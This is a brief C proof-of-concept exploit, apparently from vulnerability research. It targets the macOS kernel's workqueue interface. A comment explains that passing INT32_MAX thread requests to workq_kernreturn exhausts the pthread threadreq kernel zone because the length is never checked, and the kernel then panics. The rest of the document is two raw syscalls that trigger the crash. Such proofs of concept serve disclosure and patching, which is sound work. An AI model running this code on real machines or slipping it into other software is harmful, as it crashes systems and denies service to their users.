//This POC sends INT32_MAX thread requests the workq_kernreturn syscall, which sends the request to the pthread kernel
//extension which doesn't check the length before looping against it and trying to allocate threadreq objects from the
//pthread.threadreq kernel zone.  This will exhaust the zone map and then the kernel will panic.
#include <stdint.h>
#include <unistd.h>

//Taken from libpthread-301.1.6/kern/workqueue_internal.h
#define WQOPS_QUEUE_REQTHREADS     0x20 /* request number of threads of a prio */

int main(int argc, char ** argv)
{
	syscall(367); //workq_open
	syscall(368, WQOPS_QUEUE_REQTHREADS, 0, INT32_MAX, 0x400000cc); //workq_kernreturn
	return 0;
}

